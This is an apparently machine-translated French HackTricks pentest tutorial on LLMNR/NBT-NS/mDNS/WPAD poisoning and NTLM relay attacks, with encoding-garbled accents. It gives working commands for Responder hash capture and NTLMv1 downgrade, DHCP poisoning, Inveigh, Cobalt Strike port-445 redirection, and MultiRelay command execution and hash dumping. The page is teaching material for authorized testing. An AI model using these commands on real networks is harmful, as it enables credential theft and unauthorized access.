# Spoofing LLMNR, NBT-NS, mDNS/DNS et WPAD et Attaques de Relay

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Protocoles R√©seau

### Protocoles de R√©solution de Nom Local
- **LLMNR, NBT-NS et mDNS** :
- Microsoft et d'autres syst√®mes d'exploitation utilisent LLMNR et NBT-NS pour la r√©solution de noms locaux lorsque DNS √©choue. De m√™me, les syst√®mes Apple et Linux utilisent mDNS.
- Ces protocoles sont sensibles √† l'interception et au spoofing en raison de leur nature non authentifi√©e et de diffusion sur UDP.
- [Responder](https://github.com/lgandx/Responder) peut √™tre utilis√© pour usurper des services en envoyant des r√©ponses falsifi√©es aux h√¥tes interrogeant ces protocoles.
- Des informations suppl√©mentaires sur l'usurpation de services utilisant Responder peuvent √™tre trouv√©es [ici](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Protocole de D√©couverte Automatique de Proxy Web (WPAD)
- WPAD permet aux navigateurs de d√©couvrir automatiquement les param√®tres de proxy.
- La d√©couverte est facilit√©e via DHCP, DNS, ou un retour √† LLMNR et NBT-NS si DNS √©choue.
- Responder peut automatiser les attaques WPAD, dirigeant les clients vers des serveurs WPAD malveillants.

### Responder pour le Poisoning de Protocole
- **Responder** est un outil utilis√© pour empoisonner les requ√™tes LLMNR, NBT-NS et mDNS, r√©pondant s√©lectivement en fonction des types de requ√™tes, ciblant principalement les services SMB.
- Il est pr√©install√© dans Kali Linux, configurable √† `/etc/responder/Responder.conf`.
- Responder affiche les hachages captur√©s √† l'√©cran et les enregistre dans le r√©pertoire `/usr/share/responder/logs`.
- Il prend en charge √† la fois IPv4 et IPv6.
- La version Windows de Responder est disponible [ici](https://github.com/lgandx/Responder-Windows).

#### Ex√©cution de Responder
- Pour ex√©cuter Responder avec les param√®tres par d√©faut : `responder -I <Interface>`
- Pour un probing plus agressif (avec des effets secondaires potentiels) : `responder -I <Interface> -P -r -v`
- Techniques pour capturer les d√©fis/r√©ponses NTLMv1 pour un craquage plus facile : `responder -I <Interface> --lm --disable-ess`
- L'usurpation WPAD peut √™tre activ√©e avec : `responder -I <Interface> --wpad`
- Les requ√™tes NetBIOS peuvent √™tre r√©solues √† l'IP de l'attaquant, et un proxy d'authentification peut √™tre mis en place : `responder.py -I <interface> -Pv`

### Poisoning DHCP avec Responder
- Le spoofing des r√©ponses DHCP peut empoisonner de mani√®re permanente les informations de routage d'une victime, offrant une alternative plus discr√®te au poisoning ARP.
- Cela n√©cessite une connaissance pr√©cise de la configuration du r√©seau cible.
- Ex√©cution de l'attaque : `./Responder.py -I eth0 -Pdv`
- Cette m√©thode peut capturer efficacement les hachages NTLMv1/2, mais n√©cessite une manipulation prudente pour √©viter toute perturbation du r√©seau.

### Capture de Credentials avec Responder
- Responder usurpera des services en utilisant les protocoles mentionn√©s ci-dessus, capturant des credentials (g√©n√©ralement NTLMv2 Challenge/Response) lorsqu'un utilisateur tente de s'authentifier contre les services usurp√©s.
- Des tentatives peuvent √™tre faites pour r√©trograder vers NetNTLMv1 ou d√©sactiver ESS pour un craquage de credentials plus facile.

Il est crucial de noter que l'utilisation de ces techniques doit √™tre effectu√©e l√©galement et √©thiquement, en s'assurant d'une autorisation appropri√©e et en √©vitant toute perturbation ou acc√®s non autoris√©.

## Inveigh

Inveigh est un outil pour les testeurs de p√©n√©tration et les √©quipes rouges, con√ßu pour les syst√®mes Windows. Il offre des fonctionnalit√©s similaires √† Responder, effectuant des attaques de spoofing et de man-in-the-middle. L'outil a √©volu√© d'un script PowerShell √† un binaire C#, avec [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) et [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) comme versions principales. Des param√®tres d√©taill√©s et des instructions peuvent √™tre trouv√©s dans le [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh peut √™tre op√©r√© via PowerShell :
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ou ex√©cut√© en tant que binaire C# :
```bash
Inveigh.exe
```
### NTLM Relay Attack

Cette attaque exploite les sessions d'authentification SMB pour acc√©der √† une machine cible, accordant un shell syst√®me si elle r√©ussit. Les pr√©requis cl√©s incluent :
- L'utilisateur authentifi√© doit avoir un acc√®s administrateur local sur l'h√¥te relay√©.
- La signature SMB doit √™tre d√©sactiv√©e.

#### 445 Port Forwarding and Tunneling

Dans les sc√©narios o√π l'introduction directe dans le r√©seau n'est pas faisable, le trafic sur le port 445 doit √™tre redirig√© et tunnel√©. Des outils comme [**PortBender**](https://github.com/praetorian-inc/PortBender) aident √† rediriger le trafic du port 445 vers un autre port, ce qui est essentiel lorsque l'acc√®s administrateur local est disponible pour le chargement de pilotes.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Autres Outils pour l'Attaque de Relais NTLM

- **Metasploit** : Configur√© avec des proxies, des d√©tails sur les h√¥tes locaux et distants.
- **smbrelayx** : Un script Python pour relayer des sessions SMB et ex√©cuter des commandes ou d√©ployer des portes d√©rob√©es.
- **MultiRelay** : Un outil de la suite Responder pour relayer des utilisateurs sp√©cifiques ou tous les utilisateurs, ex√©cuter des commandes ou extraire des hachages.

Chaque outil peut √™tre configur√© pour fonctionner via un proxy SOCKS si n√©cessaire, permettant des attaques m√™me avec un acc√®s r√©seau indirect.

### Fonctionnement de MultiRelay

MultiRelay est ex√©cut√© depuis le _**/usr/share/responder/tools**_ r√©pertoire, ciblant des IP ou des utilisateurs sp√©cifiques.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Ces outils et techniques forment un ensemble complet pour mener des attaques par relais NTLM dans divers environnements r√©seau.

### Forcer les connexions NTLM

Dans Windows, vous **pouvez √™tre en mesure de forcer certains comptes privil√©gi√©s √† s'authentifier sur des machines arbitraires**. Lisez la page suivante pour apprendre comment :

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## R√©f√©rences
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
